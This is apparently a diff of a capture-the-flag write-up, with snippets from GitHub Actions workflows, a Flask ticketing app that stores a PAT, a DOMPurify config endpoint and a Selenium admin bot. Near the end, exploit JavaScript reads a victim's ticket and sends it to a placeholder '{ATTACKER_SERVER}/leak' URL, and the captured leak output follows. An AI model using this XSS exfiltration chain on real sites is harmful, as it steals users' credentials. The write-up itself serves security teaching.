@@ -60,11 +60,6 @@ t += 328
 p = 3562927236051182334153575355087347127407987755959461320351305838619130268209476696833779953363710389416751
 
 print(f'To access the course:\n "https://" + DECODE({hex(p)[2:]}) + "/{hex(t)[2:]}"')
-```
-
-
-
-```
 name: Grade the Pull Request
 on:
  workflow_run:
@@ -98,17 +93,12 @@ jobs:
  ruby grading/script/grading.rb
  env:
  FLAG: ${{ secrets.FLAG }}
-```
-
-
-
-```
 name: PR Management
 
 on:
  pull_request_target:
  types: [opened]
- branches-ignore: 
+ branches-ignore:
  - 'main'
 
 jobs:
@@ -130,21 +120,11 @@ jobs:
  last_commit_age_days: -1
  ignore_branches: main,grading
  dry_run: no
-```
-
-
-
-```
 ticket = Ticket(
  id=uuid4().hex,
  from_id=2,
  content=f"<h4>Hi team!\nI'm having some issues with the authentication API, can you check if this PAT works for you?\nThanks in advance!\nPAT: {os.environ.get('FINAL_EXAM_PAT', 'A cool PAT')}</h4>"
 )
-```
-
-
-
-```
 @app.route("/api/ticket/<ticket_id>", methods=["GET"])
 @login_required
 def api_profile(ticket_id):
@@ -155,11 +135,6 @@ def api_profile(ticket_id):
  return jsonify(content=ticket.content)
  else:
  jsonify(error="You are not allowed to see this ticket")
-```
-
-
-
-```
 @app.route("/api/ticket/<ticket_id>/report", methods=["GET"])
 @login_required
 def api_ticket_report(ticket_id):
@@ -170,11 +145,6 @@ def api_ticket_report(ticket_id):
  return jsonify(success="An agent will review your report soon")
  else:
  return jsonify(error="You are not allowed to see this ticket")
-```
-
-
-
-```
 driver.get("/signin")
 
 WebDriverWait(driver, 10).until(
@@ -187,14 +157,9 @@ driver.find_element("id", "submitButton").click()
 driver.get("/ticket/{ticket_id}")
 
 sleep(os.environ.get("BROWSER_SLEEP"))
-```
-
-
-
-```
 <!-- TODO: Improve ticket rendering and add button to report to an agent -->
-<div id="about"></div>
-<div id="ticket"></div>
+
+
 
 <script>
  const getDOMPurifyConfig = async (url) => {
@@ -218,53 +183,28 @@ sleep(os.environ.get("BROWSER_SLEEP"))
 
  main()
 </script>
-```
-
-
-
-```
 # Note to researchers, default configuration is enough to prevent XSS attacks
 @app.route("/api/dompurify_config", methods=["GET"])
 def dompurify_config():
  return jsonify(configuration={})
-```
-
-
-
-```
 {% if tickets %}
-<div class="list-group">
+
  {% for ticket in tickets -%}
- <a id="ticket" href="/ticket/{{ ticket.id }}" class="list-group-item list-group-item-action">{{ticket.id }}</a>
+ [{{ticket.id }}](/ticket/{{ ticket.id }})
  {% endfor %}
-</div>
+
 {% endif %}
-```
-
-
-
-```
 r = await fetch('/profile/2');
 text = await r.text();
 
 const parser = new DOMParser();
 const doc = parser.parseFromString(text, 'text/html');
 const ticket_id = doc.getElementById("ticket").href.split("/")[4];
-```
-
-
-
-```
 r = await fetch('/api/ticket/' + ticket_id);
 json = await r.json();
 
 await fetch('{ATTACKER_SERVER}/leak?foo=' + encodeURIComponent(JSON.stringify(json)));
-```
-
-
-
-```
-ImmutableMultiDict([('foo', '{"content":"<h4>Hi team!\\nI\'m having some issues with the authentication API, can you check if this PAT works for you?\\nThanks in advance!\\nPAT: <PAT_HERE></h4>"}')])
+ImmutableMultiDict([('foo', '{"content":"<h4>Hi team!\\nI\'m having some issues with the authentication API, can you check if this PAT works for you?\\nThanks in advance!\\nPAT: </h4>"}')])
 ```
 
 
